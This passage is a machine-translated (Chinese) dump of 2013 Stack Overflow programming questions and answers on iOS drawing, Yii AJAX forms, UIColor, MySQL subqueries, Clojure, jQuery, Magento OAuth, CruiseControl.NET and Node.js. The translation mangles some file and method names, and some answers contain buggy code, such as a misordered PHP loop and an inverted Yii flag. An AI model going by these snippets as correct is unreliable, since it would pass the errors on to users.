    CGContextSetLineCap(UIGraphicsGetCurrentContext(), kCGLineCapRound);
    CGContextSetLineWidth(UIGraphicsGetCurrentContext(), brush);
    CGContextSetRGBStrokeColor(UIGraphicsGetCurrentContext(), red, green, blue, opacity);
    CGContextMoveToPoint(UIGraphicsGetCurrentContext(), lastPoint.x, lastPoint.y);
    CGContextAddLineToPoint(UIGraphicsGetCurrentContext(), lastPoint.x, lastPoint.y);
    CGContextStrokePath(UIGraphicsGetCurrentContext());
    CGContextFlush(UIGraphicsGetCurrentContext());
    self.tempDrawImage.image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
}

UIGraphicsBeginImageContext(self.mainImage.frame.size);
//[self.mainImage.image drawInRect:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height) blendMode:kCGBlendModeNormal alpha:1.0];
[self.mainImage.image drawInRect:CGRectMake(0, 0, self.drawSignView.frame.size.width, self.drawSignView.frame.size.height) blendMode:kCGBlendModeNormal alpha:1.0];

//[self.tempDrawImage.image drawInRect:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height) blendMode:kCGBlendModeNormal alpha:opacity];
[self.tempDrawImage.image drawInRect:CGRectMake(0, 0, self.drawSignView.frame.size.width, self.drawSignView.frame.size.height) blendMode:kCGBlendModeNormal alpha:opacity];
self.mainImage.image = UIGraphicsGetImageFromCurrentImageContext();
self.tempDrawImage.image = nil;
UIGraphicsEndImageContext();
} 
```

我谷歌它，但我没有找到任何答案.. 请提出任何想法或建议。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T12:19:26.347

如果您想`touches*`在视图中使用系列，则必须制作实现该方法的自定义类。

1.  在您的情况下，您必须创建`SomeImageView`属于`UIImageView`.

2.  或者您可以使用 `UIGestureRecognizer`like`UITapGestureRecognizer`或的子类`UIPinchGestureRecognizer`。在你`viewDidLoad`的控制器中，

    ```
    self.tapGestureRecognizer = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handleTap:)];
    self.tapGestureRecognizer.cancelsTouchesInView = NO;
    self.tapGestureRecognizer.delegate = self;
    self.tapGestureRecognizer.numberOfTapsRequired = 1; // invoked at 1 tap. 
    self.photoScaleFrameView addGestureRecognizer:self.tapGestureRecognizer]; 
    ```

在你的controller.m

```
 - (void)handleTap:(UITapGestureRecognizer*)recognizer {
           NSLog(@"tap gesture detected");
    } 
```

和砰。

# php - Renderpartial() 不要为 AjaxSubmitButton 生成新的 Jquery 代码

> ID：15899322
> 
> 赞同：1
> 
> 时间：2013-04-09T10:18:54.050
> 
> 标签：php, yii

控制器中有两个动作：

**C简介：**

```
public function actionCProfile()
{
$model=$this->loadModel(Yii::app()->user->id);
$model->scenario = 'updateProfile';
$this->performAjaxValidation($model);

if(isset($_POST['User'])){
    $model->attributes=$_POST['User'];

    if($model->validate())
        if($model->save()){
            if(Yii::app()->request->isAjaxRequest)
                Yii::app()->end('saved');
            else{
                Yii::app()->user->setFlash('status','saved');
            }
        }

    if(Yii::app()->request->isAjaxRequest)
        if(!$model->validate())
            Yii::app()->end('!validate');
}

if(Yii::app()->request->isAjaxRequest)
    $this->renderPartial('_cprofile',array('model'=>$model));
else
    $this->render('update',array('model'=>$model,'form'=>'_cprofile'));
} 
```

和**CPass：**

```
public function  actionCPass()
{
$model = $this->loadModel(Yii::app()->user->id);
$model->scenario = 'CPass';
$this->performAjaxValidation($model);

if(isset($_POST['User'])){
    $model->attributes = $_POST['User'];
    if($model->validate()){
        if($model->verifyPassword($model->currentPass)){
            $model->changePassword($model->newPass);
            Yii::app()->end('changed');
        }
    }
}

if(Yii::app()->request->isAjaxRequest)
    $this->renderPartial('_cpass',array('model'=>$model));
else
    $this->render('update',array('model'=>$model,'form'=>'_cpass'));
} 
```

和三个视图文件：

**更新.php：**

```
<?php
$cs = Yii::app()->clientScript;
$cs->registerCssFile('/x/css/myDetailview.css');
$cs->registerCssFile('/x/css/upanel/user-profile.css');
$url = Yii::app()->getBaseUrl().'/js/upanel.js';
$cs->registerScriptFile($url,CClientScript::POS_HEAD);

?>

<div id='user-profile-menu'>
    <ul>
        <li><?php echo CHtml::link('profile',Yii::app()->createUrl('/upanel/user/CProfile'),array('id'=>'profile-change-link')) ?></li>
        <li><?php echo CHtml::link('change email',Yii::app()->createUrl('/upanel/user/CPass'),array('id'=>'pass-change-link')) ?></li>
    </ul>
</div>

<div id='container'>
<?php $this->renderPartial($form,array('model'=>$model)); ?>
</div> 
```

**_cprofile.php：**

```
<div class="form" >
        <?php
        $form = $this->beginWidget('CActiveForm',array(
            'id'=>'change-profile-form',
            'enableAjaxValidation'=>true,
            'enableClientValidation'=>true,
            'action' => 'index.php?r=upanel/user/cprofile',
            'method' => 'post',
            'clientOptions'=>array(
                'validateOnSubmit'=>true,
                'validateOnChange'=>true,
                'validateOnType'=>false,
            ),
        ));
        ?>

.
.
.
        <div class="row">
            <?php
                $url=Yii::app()->createUrl('upanel/user/CProfile');
                echo CHtml::ajaxSubmitButton('update',$url,
                    array(
                        'type'=>'POST',
                        'data'=>"js:$('#change-profile-form').serialize()",
                        'success'=>'callback',
                        'beforeSend'=>'before',
                    ),
                    array(
                        'id'=>'update-button',
                        'class'=>'submit-button',
                    )
                );
            ?>
        </div>
        <?php $this->endWidget() ?>

<?php echo $form->errorSummary($model,'resolve following errors: ') ?> 
```

**_cpass.php：**

```
<div class="form">
        <?php
        $form = $this->beginWidget('CActiveForm',array(
            'id'=>'change-pass-form',
            'enableAjaxValidation' => 'true',
            'action' => Yii::app()->createUrl('upanel/user/CPass'),
            'method' => 'POST',
            'clientOptions' => array(
                'validateOnSubmit' => true,
                'validateOnChange' => true,
                'validateOnType' => false,
            )
        ));
        ?>

.
.
.
        <div class="row">
            <?php
          $url=Yii::app()->createUrl('upanel/user/CPass');
                echo CHtml::ajaxSubmitButton('update',$url,
                    array(
                        'type'=>'POST',
                        'data'=>"js:$('#change-pass-form').serialize()",
                        'success'=>'callback',
                        'beforeSend'=>'before',
                    ),
                    array(
                        'id'=>'update-button',
                        'class'=>'submit-button',
                    )
                );
            ?>
        </div>
        <?php $this->endWidget() ?>

</div> <!-- End Password Form -->
<?php echo $form->errorSummary($model) ?> 
```

* * *

# **编辑＃1：**

看，我有一个`view`名为的页面`update.php`，在这个页面中有两个链接：

```
<div id='user-profile-menu'>
<ul>
    <li><?php echo CHtml::link('profile',Yii::app()->createUrl('/upanel/user/CProfile'),array('id'=>'profile-change-link')) ?></li>
    <li><?php echo CHtml::link('Change Password',Yii::app()->createUrl('/upanel/user/CPass'),array('id'=>'pass-change-link')) ?></li>
</ul> 
```

以下 JQuery 代码运行存在`actions`于 中`controller`，结果是`renderpartial()`这些视图文件之一：`_cpass.php`或`_profile.php`

```
$('document').ready(function(){

$('#profile-change-link').click(function(){
    var link = $(this).attr('href');
    $('#container').load(link);
    return false;
})

$('#pass-change-link').click(function(){
    var link = $(this).attr('href');
    $('#container').load(link);
    return false;
})

}); 
```

在控制器`CProfile`动作中定义为`default action`. 使用此操作，POST 和 Ajax 方法中的哪一个没有任何问题。

但主要问题：在该`_cpass.php`视图替换为`_profile`并已发送存在`form`于处理遇到问题的操作中`_profile`。`CPass`问题是这样的：

预期的以下代码的输出是`1`：

```
 public function  actionCPass()
{
    $model = $this->loadModel(Yii::app()->user->id);
    $model->scenario = 'CPass';
    $this->performAjaxValidation($model);

    if (1==1)
        Yii::app()->end('1');
} 
```

但是以下代码的输出并不是我们所期望的。返回值是一个`renderpartial()`视图`_profile`。而动作代码中没有任何关于`_cprofile`视图的相关`CPass`代码！

```
 public function  actionCPass()
{
    $model = $this->loadModel(Yii::app()->user->id);
    $model->scenario = 'CPass';
    $this->performAjaxValidation($model);

    if(isset($_POST['User'])){
        $model->attributes = $_POST['User'];
        if($model->validate()){
            if($model->verifyPassword($model->currentPass)){
                $model->changePassword($model->newPass);
                Yii::app()->end('changed');
            }
        }
    }

    if(Yii::app()->request->isAjaxRequest)
        $this->renderPartial('_cpass',array('model'=>$model));
    else
        $this->render('update',array('model'=>$model,'form'=>'_cpass'));
} 
```

上述代码的输出：

```
<div class="form" >

        <form id="change-profile-form" action="index.php?r=upanel/user/cprofile" method="post">
.
.
.                      
        <div class="row">

            <input id="update-button" class="submit-button" type="submit" name="yt0" value="update" />        </div>

        </form>

</div> <!-- End The Profile Form  -->

<div id="change-profile-form_es_" class="errorSummary" style="display:none">resole following errors:
<ul><li>dummy</li></ul></div> 
```

现在明白是什么问题了吗？问题仅存在于**Ajax**请求中，当在浏览器中禁用**javascript**`CPass`时，该操作真正起作用。

对不起，如果首先解释得很糟糕。

谢谢朋友

* * *

# **编辑#2：**

使用 Firebug 进行调试时，我注意到 JQuery 代码片段没有改变。

首次进入`default action`此`controller`代码时：

```
$this->renderPartial('_cprofile',array('model'=>$model)); 
```

运行以下 JQuery 代码将创建：（如您所知，以下代码与**CHtml::ajaxSubmitButton**相关）

```
$('body').on('click','#update-button',function(){jQuery.ajax({'type':'POST','data':$('#change-profile-form').serialize(),'success':callback,'beforeSend':before,'url':'/x/index.php?r=upanel/user/CProfile','cache':false});return false;}); 
```

因此，当视图使用方法进行`_cpass`渲染时，上面的 JQuery 代码必须更改但不会更改。我想它一定是下面的代码：`renderpartial()``CPass`

```
$('body').on('click','#update-button',function(){jQuery.ajax({'type':'POST','data':$('#change-cpass-form').serialize(),'success':callback,'beforeSend':before,'url':'/x/index.php?r=upanel/user/CPass','cache':false});return false;}); 
```

### 所以我的问题是为 CHtml::ajaxSubmitButton 生成的 JQuery 代码。谁能帮我？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T18:51:25.590

1.  重命名一个/两个按钮 ID。这意味着事件处理程序将附加到不同的按钮。
2.  `renderPartial('view.path',array(parameter_array),false,true);`通过 Ajax 返回视图时使用。在适当位置插入所需客户端脚本的[`CController::renderPartial()`](http://www.yiiframework.com/doc/api/1.1/CController#renderPartial-detail)调用的最后一个参数。[`CController::processOutput()`](http://www.yiiframework.com/doc/api/1.1/CController#processOutput)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T00:01:52.877

# 解决了

通过为**ajaxSubmitButton应用****uniqueId**并在**Controller Action**中设置为**True**解决了。**`CController::processOutput()`**

 ******## 摘要代码：

**行动CPass：**

```
public function  actionCPass()
{
$model = $this->loadModel(Yii::app()->user->id);
$model->scenario = 'CPass';
$this->performAjaxValidation($model);

if(isset($_POST['User'])){
    $model->attributes = $_POST['User'];
    if($model->validate()){
        if($model->verifyPassword($model->currentPass)){
            $model->changePassword($model->newPass);
            Yii::app()->end('changed');
        }
    }
}

if(Yii::app()->request->isAjaxRequest)
    $this->renderPartial('_cpass',array('model'=>$model),false,true);
else
    $this->render('update',array('model'=>$model,'form'=>'_cpass'));
} 
```

**_cpass.php：**

```
 .
            .
            .
            <?php
            echo CHtml::ajaxSubmitButton(
                'update',
                Yii::app()->createUrl('upanel/user/CPass'),
                array(
                    'type'=>'POST',
                    'data'=>"js:$('#change-pass-form').serialize()",
                    'success'=>'callback',
                    'beforeSend'=>'before',
                ),
                array(
                    'id'=>'update-button'.uniqid(),
                    'class'=>'submit-button',
                )
            );
            .
            .
            .
        ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T15:15:17.327

我想我理解你的问题，你想知道为什么页面没有周围的`<div id='profile-container'>`and `</div>`。

我认为这可能与渲染函数只能在每个调用的视图中运行一次有关（因此它只渲染内部视图），您可以通过从更新页面中删除 renderPartial 并查看它是否打印空白来测试它分区。

解决此问题的一种方法是，不要进行两次渲染，而是始终调用每个页面（即使在 ajax 请求中），但如果它是 ajax 请求，则传递一个额外的属性。然后在每个页面上开始和结束一个自定义小部件，其中包含您在这些页面上想要的周围模板（或者只是手动编写）。

示例： **控制器**

```
public function actionCProfile()
{
    // ... same as your example
    if(Yii::app()->request->isAjaxRequest){
        $this->renderPartial('_cprofile',array('model'=>$model, 'wasAjax'=>false));
    } else {
        $this->renderPartial('_cprofile',array('model'=>$model, 'wasAjax'=>true));
    }
} 
```

然后在您的视图中检查 wasAjax 是否为真，如果是则打印周围的 div（或额外元素）。如果这很大或以后可能会更改，请将其放入自定义小部件中。******

# c# - 使用 C# 显示 Flash 图像的缩略图

> ID：15899324
> 
> 赞同：0
> 
> 时间：2013-04-09T10:18:58.887
> 
> 标签：c#, flash

我的应用程序中有一个网格，其中显示图像的缩略图（100 * 100）。我正在使用[imageresizing.net](http://imageresizing.net/)插件即时生成缩略图。我的图片 URL 来自第三方应用程序。有时，我得到的不是图像，而是 Flash 文件 (.SWF)。该插件正在抛出`ImageCorruptedException`.

截至目前，我正在处理`Application_Error`Global.asax 中的异常并返回默认图像 URL。

现在我想显示 Flash 图像的缩略图而不是默认图像。如何在 C# 中实现这一点？我在谷歌上搜索了很多，但没有令人信服的答案。

# dynamics-nav - Navision 三层架构可以在没有 Kerberos 的情况下工作吗？

> ID：15899328
> 
> 赞同：1
> 
> 时间：2013-04-09T10:19:11.640
> 
> 标签：dynamics-nav, navision

Navision 2009 R2 三层架构可以在没有 Kerberos 的情况下工作吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-16T12:26:49.007

如果 SQL Server 和 NAV Server 安装在一台计算机上，而客户端位于另一台计算机上，则 NAV 可以使用工作组身份验证（客户端和服务器上都存在具有相同名称和密码的 Windows 帐户）。

如果您想在没有 Kerberos 的情况下在三台计算机上运行三层，我相信可以通过盗用为 RTC over WAN 引入的功能来实现。这将起作用的原因是这会强制客户端在服务器机器上进行身份验证（因此这等效于上述第一个场景）。

[MSDN 上提供了](http://msdn.microsoft.com/en-us/library/gg502476.aspx)通过广域网连接 RoleTailored 客户端的演练。

或者，您可以升级到 NAV 2013，它引入了类似于 C/SIDE 中使用的 SQL 登录的 NAV 登录。因此，在没有 Kerberos 的情况下，NAV 2013 更容易配置。

# java - Maven 中 Trove 2 和 Trove 3 的同时依赖关系

> ID：15899330
> 
> 赞同：2
> 
> 时间：2013-04-09T10:19:14.577
> 
> 标签：java, maven, trove4j

根据 Trove 3 发行说明

> 为了帮助迁移，每个类都移到了不同​​的包中，这允许 Trove 的早期版本与 Trove 3.x 共存。因此，您不必一次更改所有内容。

但是，当 Trove 2 和 Trove 3 具有相同的 groupId 和 artifactId 时，是否真的可以将 Trove 2 和 Trove 3 作为 Maven 中的依赖项？

# objective-c - UIView 背景颜色白色

> ID：15899333
> 
> 赞同：0
> 
> 时间：2013-04-09T10:19:21.197
> 
> 标签：objective-c, uitableview, uicolor

我的表视图控制器中有以下代码。它返回表中节标题的自定义视图。

```
- (UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section {
    UIView *header = [[UIView alloc] initWithFrame:CGRectMake(0, 0, tableView.bounds.size.width, 30)];

    if (tableView == contentTable && section == 0) {
        // When I set backgroundColor to [UIColor redColor] it works. Otherwise white.
        [header setBackgroundColor:[UIColor colorWithRed:10.f green:12.f blue:88.f alpha:1.f]];
    } else {
        [header setBackgroundColor:[UIColor clearColor]];
    }

    return header;
}

- (CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section {
    if (tableView == contentTable && section == 0) {
        return 30;
    }

    return 0;
} 
```

现在这段代码工作正常，但是返回的视图是白色的。例如，如果我将其设置`backgroundColor`为`[UIColor redColor]`，它将变为红色。但是，如果我设置自定义 RGB 值，它将保持白色。我使用了 Photoshop 中的 RGB 值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:21:36.343

RGB 值是浮点数，其范围必须介于`0.0f`和之间`1.0f`。如果要从 0-255 值转换，请将每个值除以`255.0f`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:22:54.563

```
[header setBackgroundColor:[UIColor colorWithRed:10.0f/255.0 green:12.0f/255.0 blue:88.0f/255.0 alpha:1.f]]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T12:06:45.303

如果要使用 Photoshop 中的颜色值，可以使用类似

```
[UIColor colorWithRed:10.f/255.0f green:12.f/255.0f blue:88.f/255.0f alpha:1.0f]]; 
```

这是我使用的方式。

玩的开心！

# php - 2 个不同的小查询与 1 个带有子查询的查询

> ID：15899336
> 
> 赞同：14
> 
> 时间：2013-04-09T10:19:25.563
> 
> 标签：php, mysql

我有这样的桌子

```
name       | personal_number 
-----------------------------------------
Jon        | 222
Alex       | 555
Jon        | 222
Jimmy      | 999 
```

我需要获取每个名称，其中personal_number 在表中重复超过1，即结果必须是：

```
 Jon        
 Jon 
```

因此，变体 1)：

```
SELECT  name  FROM mytable WHERE personal_number IN (
        SELECT  personal_number  FROM mytable  GROUP BY personal_number
        HAVING COUNT(*) > 1
) 
```

变体 2)：

```
SELECT  personal_number  FROM mytable  GROUP BY personal_number
        HAVING COUNT(*) > 1
) 
```

然后，使用 php，检索personal_numbers 作为字符串连接（类似这样`'222', '222'`）并运行其他查询

```
SELECT  name FROM mytable  WHERE personal_number IN( here joined string ) 
```

变体 2 的工作速度大约比变体 1 快 10 倍，这让我感到惊讶，我认为一个查询会更快，但是......

（表中有 500 000 行，列`personal_number`未编入索引）

那么，你对这种情况的意思是什么？为什么变体 2 比变体 1 快很多？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:35:26.223

如本文[http://www.mysqlperformanceblog.com/2010/10/25/mysql-limitations-part-3-subqueries](http://www.mysqlperformanceblog.com/2010/10/25/mysql-limitations-part-3-subqueries)中所述，子查询似乎非常慢。

您应该尽量避免使用子查询并改用加入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:37:41.803

第一个查询有繁重的子查询。你必须避免这种情况。您的问题的最佳解决方案是只有一个查询：

```
SELECT name FROM mytable GROUP BY personal_number HAVING COUNT(*) > 1; 
```

此查询将只为您返回每个重复的名称一次。如果要显示重复项的名称，就必须使用下一个查询：

```
SELECT name, COUNT(*) AS count FROM mytable GROUP BY personal_number HAVING COUNT(*) > 1; 
```

然后在 PHP 中做这样的事情：

```
foreach ($rows as $row) {
  for ($i = 0; $i++; $i < $row['count']) {
    echo $row['name'] . "\n";
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:29:12.323

这应该更快：

```
SELECT  name  FROM mytable join (
        SELECT  personal_number  FROM mytable  GROUP BY personal_number
        HAVING COUNT(*) > 1
)a using (personel_number) 
```

编辑：如果这比变体 1 快，那么这意味着在变体 1 mysql 一次又一次地为每个记录再现内部表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T10:30:48.137

由于未完成索引，因此 1 很慢，因为它必须匹配所选个人号码中的个人号码。如果索引完成，它比以前消耗的时间更少。变体 2 是直接查询，因此速度更快。

# clojure - 惯用的 clojure 前缀替换

> ID：15899339
> 
> 赞同：1
> 
> 时间：2013-04-09T10:19:35.057
> 
> 标签：clojure

我有一张地图，表示有关颠覆提交的信息。

示例内容：

```
(def commit 
  {:repository "/var/group1/project1"
   :revision-number "1234"
   :author "toolkit"
   etc..} 
```

我想根据前缀匹配更改存储库，以便：

```
/var/group1 maps to http://foo/group1
/var/group2 maps to http://bar/group2 
```

我创建了 2 个函数，例如：

```
(defn replace-fn [prefix replacement]
  (fn [str]
    (if (.startsWith str prefix)
      (.replaceFirst str prefix replacement)
      str)))

(def replace-group1 (replace-fn "/var/group1" "http://foo/group1"))
(def replace-group2 (replace-fn "/var/group2" "http://bar/group2")) 
```

现在我必须应用它们：

```
(defn fix-repository [{:keys [repository] :as commit}]
  (assoc commit :repository
    (replace-group1
      (replace-group2 repository)))) 
```

但这意味着我必须在我的修复存储库中为每个新的替换添加一个额外的包装器。

我想简单地说：

*   给定一个提交映射
*   提取 :repository 值
*   循环遍历替换前缀列表
*   如果任何前缀匹配，则将 :repository 值替换为新字符串
*   否则，请单独保留 :repository 值。

我似乎无法为此建立正确的循环、减少或其他解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:35:29.520

您可以使用函数组合：

```
(def commit 
  {:repository "/var/group2/project1"
   :revision-number "1234"
   :author "toolkit"})

(defn replace-fn [prefix replacement]
  (fn [str]
    (if (.startsWith str prefix)
      (.replaceFirst str prefix replacement)
      str)))

(def replacements
  (comp (replace-fn "/var/group1" "http://foo/group1")
        (replace-fn "/var/group2" "http://foo/group2")))

(defn fix-repository [commit replacements]
  (update-in commit [:repository] replacements))

(fix-repository commit replacements) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:35:39.123

这样的事情怎么样？

```
(defn replace-any-prefix [replacements-list string]
  (or (first
        (filter identity
          (map (fn [[p r]]
                 (when (.startsWith string p)
                    (.replaceFirst string p r)))
               replacements-list)))
      string)))

(update-in commit
           [:repository]
           (partial replace-any-prefix
                    [["/var/group1" "http://foo/group1"]
                     ["/var/group2" "http:/foo/group2"]])) 
```

更新文档：[http ://clojuredocs.org/clojure_core/clojure.core/update-in](http://clojuredocs.org/clojure_core/clojure.core/update-in)

# c# - jQuery webservice foreach 循环

> ID：15899341
> 
> 赞同：2
> 
> 时间：2013-04-09T10:19:39.873
> 
> 标签：c#, jquery, asp.net, web-services

我正在尝试使用此 web 服务结果集来查询下拉列表，该`getYears`函数正在返回 2013、2012、2011 年的列表......在 L`ist<string>`中，但是当我将它与`ddlyears`出现的值绑定为 1、2、3 时， 4,5,6

```
 $.ajax({
        type: "POST",
        url: "../WebService.asmx/getYears",
        data:"{}",
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        async: true,
        success: function (msg) {

        for (var myVar in msg.d) {
            $('#ddlyears').append("<option value='" + myVar.toString() + "'>" + myVar.toString() + "</option>");
        }
    },
    error: function (jqerr) {
        errorCaller(jqerr);
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:24:35.400

试试这个：

```
success: function (msg) {

    $.each(msg.d, function (k, value) {
        $('#ddlyears').append("<option value='" + value + "'>" + value + "</option>");
    });
} 
```

# magento - magento 休息 api 不工作

> ID：15899345
> 
> 赞同：0
> 
> 时间：2013-04-09T10:19:44.387
> 
> 标签：magento, oauth, magento-1.7

我已按照以下步骤操作。

**步骤1。**

```
localhost/magento/oauth/initiate?oauth_callback=localhost/magento/oauth_admin.php 
```

然后我得到以下回复：

```
oauth_token=bspq6x1c46xdw29lzobj3de4e6qvlt4a&oauth_token_secret=y636yh3zih27dq27lyzukez06b3vb1sp&oauth_callback_confirmed=true 
```

**第2步。**

```
localhost/magento/oauth/authorize?oauth_token=bspq6x1c46xdw29lzobj3de4e6qvlt4a 
```

然后我得到以下回复：

```
oauth_token=t9pefrwylmg7webyepsqepotlhzbytkp&oauth_verifier=awpnxj6xng3ymu6v2v2ccnttg5mmijy1 
```

**步骤 3。**

```
localhost/magento/oauth/token?oauth_token=t9pefrwylmg7webyepsqepotlhzbytkp&oauth_token_secret=y636yh3zih27dq27lyzukez06b3vb1sp&oauth_verifier=awpnxj6xng3ymu6v2v2ccnttg5mmijy1 
```

我可以访问网址：

```
localhost/magento/api/rest/products?oauth_token=t9pefrwylmg7webyepsqepotlhzbytkp&oauth_token_secret=y636yh3zih27dq27lyzukez06b3vb1sp&oauth_verifier=awpnxj6xng3ymu6v2v2ccnttg5mmijy1 
```

但我无法访问此 URL：

```
localhost/magento/api/rest/customers?oauth_token=t9pefrwylmg7webyepsqepotlhzbytkp&oauth_token_secret=y636yh3zih27dq27lyzukez06b3vb1sp&oauth_verifier=awpnxj6xng3ymu6v2v2ccnttg5mmijy1 
```

或者这个：

```
localhost/magento/api/rest/customers?oauth_token=t9pefrwylmg7webyepsqepotlhzbytkp&oauth_token_secret=y636yh3zih27dq27lyzukez06b3vb1sp 
```

# cruisecontrol.net - 使用 CCNET 的多个项目

> ID：15899355
> 
> 赞同：0
> 
> 时间：2013-04-09T10:20:08.827
> 
> 标签：cruisecontrol.net

我有如下 GIT 回购，

```
 \main
       \Module A
       \Module B
       \Shared 
```

当我对模块 B 进行更改时，CCNET 将从模块 A 开始构建，然后是模块 B，我不希望 CCNET 这样做。这将花费很多时间。我只希望 ccnet 仅在模块 B 上构建更改。

有人请帮助我：我在 CCNET Config 中的 1 个项目：

```
enter code here
   <project name="Dashboard 5.0" queue="Dashboard_01" queuePriority="01" category="01">
<artifactDirectory>&pathToArtifactsDirectory;Dashboard 5.0\</artifactDirectory>
&workingDirectory;
<webURL>http://&buildServerAddress;/ccnet/server/&buildServerName;/project/Dashboard 5.0/ViewLatestBuildReport.aspx</webURL>
&modificationDelaySeconds;
<triggers>
  <intervalTrigger seconds='30' buildCondition='IfModificationExists'/>
  <scheduleTrigger time='03:00' buildCondition='ForceBuild' name='Scheduled'/>
  <scheduleTrigger time='11:00' buildCondition='ForceBuild' name='Scheduled'/>
</triggers>
<state type="state" directory="&pathToStatesDirectory;Dashboard 5.0\" />

    <sourcecontrol type="git">
      <repository>&gitAddress;</repository>
      <branch>master</branch>
      <autoGetSource>true</autoGetSource>
      <fetchSubmodules>false</fetchSubmodules>
      <executable>C:\Program Files (x86)\Git\cmd\git.exe</executable>

      <commitBuildModifications>false</commitBuildModifications>
      <commitUntrackedFiles>false</commitUntrackedFiles>
      <timeout>3000000</timeout>
    </sourcecontrol>

<tasks>
  <nant>
    <executable>&pathToNantFile;</executable>
    <baseDirectory>&pathToBuildScriptsDirectory;Dashboard 5.0\</baseDirectory>
    <buildArgs>-D:projects_to_build=dashboard_framework</buildArgs>
    <buildFile>cruise.build</buildFile>
    <targetList>
      <target>automate</target>
    </targetList>
    <buildTimeoutSeconds>3000</buildTimeoutSeconds>
  </nant>

</tasks>
<publishers>
  <merge>
    <files>
      <file>&pathDB5MainCheckoutDirectory;framework\build\test-reports\*Test.dll-results.xml</file>
      <file>&pathDB5MainCheckoutDirectory;framework\build\test-reports\Test*.dll-results.xml</file>
      <file>&pathDB5MainCheckoutDirectory;framework\build\test-reports\simian.xml</file>
    </files>
  </merge>
  <xmllogger />
</publishers> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T22:07:07.513

模块 A 或模块 B 的任何签入都将导致项目节点以任一方式启动。您正在寻找的内容类似于子文件夹上的 subversion update 命令所做的事情，而 Git 不打算这样做。另一种方法是，您可以为每个模块创建一个单独的存储库。构建脚本或 Nant 任务也必须分开。

在 Git 中，如果您有几个始终独立签出的目录，那么它们实际上是两个不同的项目，应该存在于两个不同的存储库中。[您可以稍后使用Git 子模块](http://book.git-scm.com/5_submodules.html)将它们重新合并在一起

# c# - 在调用 HTTP Post 方法时在 C# 应用程序中将复杂类型作为表单参数发送

> ID：15899356
> 
> 赞同：0
> 
> 时间：2013-04-09T10:20:12.030
> 
> 标签：c#, rest, http-post, asp.net-web-api

我正在使用 ASP.NET MVC 4 并提供 RESTful Web 服务。我用 GET、POST、PUT 和 DELETE Http 方法测试了我的服务，一切似乎都很好。但是，我不知道如何将包含一些其他类或集合的数据类型作为参数传递给 POST、PUT 和 DELETE 请求。

例如，以下是我的一项 POST 服务：

```
public HttpResponseMessage Post(CompanyDto input)
{
    if (this.ModelState.IsValid)
    {
        ...
    }
    return Request.CreateResponse(HttpStatusCode.BadRequest);
} 
```

我从 C# 桌面应用程序调用我的服务。问题是，Compnay 对象包含 CompanyType 对象作为属性。在调用我的 POST PUT DELETE 服务时，我无法成功发送 Company 对象作为参数。有没有一种简单的方法可以将数据类型序列化为参数，无论它们包含什么类型的属性，以便 Web API 可以在服务器端自动解析并创建相应的数据类型？

以下是我如何称呼我的服务：

```
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
request.Method = "POST";
request.ContentType = "application/x-www-form-urlencoded";
byte[] postBytes = Encoding.ASCII.GetBytes(formParameter.ToString());
Stream requestStream = request.GetRequestStream();
requestStream.Write(postBytes, 0, postBytes.Length);
requestStream.Close(); 
```

formParameter 是一个对象，其 ToString 方法使用反射创建“key1=value1&key2=value2...”。下面是执行此操作的代码：

```
public override string ToString()
{
    StringBuilder builder = new StringBuilder();

    PropertyInfo[] properties = this.data.GetType().GetProperties();
    foreach (PropertyInfo property in properties)
    {
        builder.Append(string.Format("{0}={1}&", property.Name, property.GetValue(this.data)));
    }
    builder.Remove(builder.Length - 1, 1);
    return builder.ToString();
} 
```

# node.js - Node.js res.setHeader('content-type', 'text/javascript'); 将响应 javascript 作为文件下载推送

> ID：15899357
> 
> 赞同：26
> 
> 时间：2013-04-09T10:20:21.187
> 
> 标签：node.js

**场景**：考虑以下代码以提供 JavaScript 作为来自 Node.JS 服务器的响应。

```
var http = require('http');

http.createServer(function (req, res) {
var JS_Script = 'function Test() { alert("test success")}';
res.setHeader('content-type', 'text/javascript');
res.send(JS_Script);
}).listen(8811); 
```

**问题**：它强制浏览器下载文件。

**问题**：如何让它在浏览器上呈现？

**注意**：使用相同的 .net Web 服务 `HTTP-header: 'content-type', 'text/javascript'`

因此，其明确的以下陈述并不成立。
如果您希望 Web 浏览器呈现 HTML，则应将其更改为：

```
Content-Type: text/html 
```

**更新**：在`content-type`下载过程中检查其`application/octet-stream`

但是当我用 curl 发出请求时也是一样的，输出如下：

```
C:\>curl -is http://localhost:8811/
HTTP/1.1 200 OK
Content-Type: text/javascript
Content-Length: 166
Date: Tue, 09 Apr 2013 10:31:32 GMT
Connection: keep-alive

function Test() { alert("test success")} 
```

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2013-04-09T10:46:08.747

用作`application/javascript`内容类型而不是`text/javascript`

`text/javascript`被提到过时了。请参阅参考[文档](https://www.rfc-editor.org/rfc/rfc4329)。

[http://www.iana.org/assignments/media-types/application](http://www.iana.org/assignments/media-types/application)

